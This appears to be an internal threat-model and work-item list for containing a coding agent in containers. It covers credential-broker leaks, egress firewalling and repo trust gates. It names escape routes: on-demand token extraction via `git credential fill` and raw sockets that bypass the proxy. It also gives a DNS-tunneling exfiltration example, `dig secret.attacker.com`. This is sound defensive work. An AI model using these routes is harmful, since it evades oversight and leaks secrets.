# Agent containment — work items

This doc is a threat-model + audit. Items below are candidate work; triage into the
tracker as separate issues. None implemented yet.

## P0

- [x] **Gap 2 — fix the GitHub token leak (verified live).** (a) Stop writing the inline
      `password=<token>` helper into the workspace `.git/config` (`github-auth.ts`
      `configureGitCredentials`) — it puts the `ghp_…` token in plaintext on disk; routed
      the workspace through the brokered `shipit-git-credential` helper
      (`CONTAINER_CREDENTIAL_HELPER`) instead, matching the container's global gitconfig.
      (b) The broker is host-aware: the helper forwards `host=`/`protocol=` from stdin and
      the orchestrator's `getGitCredential` emits the token only for `github.com`
      (the only host ShipIt authenticates against), echoing nothing otherwise — the inline
      local helper used to *shadow* this with a host-blind echo. Tests in
      `github-auth.test.ts` prove `git credential fill` for a non-GitHub host returns no
      credentials, that github.com still resolves via the global helper (push/pull
      unaffected), and that no plaintext token lands in `.git/config`; host scoping is
      covered by `services/github-credential.test.ts` and `agent-shim/git-credential.test.ts`.
      (TRACKER-72)
- [ ] **Gap 2-R — credential broker is caller-blind (residual after TRACKER-72).** Verified
      live 2026-06-03: `git credential fill` for `github.com` (or invoking
      `/usr/local/bin/shipit-git-credential get` directly) still returns the full `ghp_…`
      PAT to any code running in the session. The broker authorizes by host, not by caller,
      and the agent is indistinguishable from `git`. TRACKER-72 closed plaintext-at-rest and
      host-blindness but not on-demand extraction. Fix is defense-in-depth: short-lived
      repo-scoped tokens (GitHub App installation tokens, minutes-long TTL, minted
      per-turn) and/or out-of-process git (push/pull from the orchestrator host so the
      token never enters the container), with Gap 1 egress as the backstop.
- **Gap 1 — outbound egress control (SHI-90).** Full design in
  [egress-control.md](./egress-control.md). Enforcement is a network-layer gateway
  middlebox (the `HTTP_PROXY` env-var proxy is not a real control — a raw socket bypasses
  it). Delivered as **one PR, sequential commits A→B→C, each independently green**.

  **Merged (SHI-90 PR #1301):**
  - [x] Allowlist matcher (`egress-allowlist.ts` + test) — base + `SESSION_EGRESS_ALLOWLIST`
        + live MCP hosts; suffix matching rejects look-alikes. Reused by Tier C.
  - [x] The interim explicit `HTTP_PROXY` proxy was reverted before merge (non-enforcing;
        superseded by the netns-sidecar enforcement below).

  **Architecture resolved (egress-control.md):** enforcement is installed **inside the
  agent's own netns** by privileged orchestrator-launched sidecars
  (`--network container:<agent> --cap-add NET_ADMIN`) — no separate network / gateway /
  routing. SHI-31's non-root agent makes the Tier C owner-match exemption unambiguous.

  **To build (the actual control):**
  - **Tier A** — iptables default-deny (`OUTPUT DROP`) + `ipset` allow-set installed in the
    agent netns by a short-lived sidecar; allow-set = resolved FQDNs + `gh api meta` CIDR
    (resolve-before-deny ordering), `example.com`-must-fail self-test.
    - [x] Allow-set logic core (`egress-firewall.ts` + test): `gh api meta` CIDR
          parse/dedupe, ipset member composition + validation, concrete resolve-host list.
    - [ ] Sidecar image + installer script (iptables/ipset, resolve-before-deny, self-test)
          and orchestrator wiring to launch it in the agent netns. *Requires a live Docker
          host to verify — not unit-testable in the sandbox.*
  - [ ] **Tier B** — controlled DNS resolver at the gateway: answers only allowlisted
        names (closes DNS tunneling — `dig secret.attacker.com`) and drives the ipset with
        the IPs it returns (kills stale-IP breakage). The correction over Anthropic's
        DNS-open reference; minimum tier that contains exfil.
  - [ ] **Tier C** — transparent SNI/CONNECT proxy (reuse the matcher) for hostname-level
        HTTPS policy, the allow-once / add-to-allowlist inline card (deny-fast + retry,
        persisted), and the Phase-2 hook. **Removes** the `HTTP_PROXY`/`NO_PROXY` env
        injection currently on the branch.
  - [ ] **Settings UI** — default-on global toggle (fail-secure, applies on container
        restart) + per-session override + allowlist editor. Browser-only routes are
        protected by SHI-129's per-route default-deny (just don't set
        `containerAccessible`); optionally add high-value ones to `HARD_DENY_PREFIXES`
        (`isHardDeniedGlobal`) as a backstop; update the golden route-table test.
- [ ] **Gap 1 — identity-validating proxy (Phase 2)** for allowlisted multi-tenant hosts so
      an approved API can't be used to upload into an attacker's account. Builds on the
      Tier C proxy hook.

## P1

- [x] **Gap 3 — per-repo trust gate (shipped, docs/178).** Defers `agent.install` and
      compose `command:`/`build:` on first open of an untrusted remote until the user
      accepts via `RepoTrustBanner` (`POST /api/repos/trust`); decision persisted per
      remote in `RepoStore` (`trusted` column, `isTrusted()`/`setTrusted()`); warm-pool
      pre-install gated; ShipIt-created template repos trusted by construction.
      (`service-manager-setup.ts`, `docs/178-repo-trust-gate`)

## P2

- [ ] **Gap 6 — read-only mounts.** Downgrade `/uploads` (and `/credentials` after
      first-turn provisioning) to `:ro` where the agent has no legitimate write need.
- [ ] **Gap 5 — kernel-tier hardening.** Evaluate gVisor (`runsc`) runtime, a custom
      seccomp profile, and `ReadonlyRootfs: true` with explicit writable mounts.

## Cross-cutting

- [ ] **Gap 4 — untrusted-input lens.** Treat uploaded files, cloned-repo content, web
      fetches, and MCP tool returns as untrusted; fold into the egress/trust work and
      apply to future input surfaces.
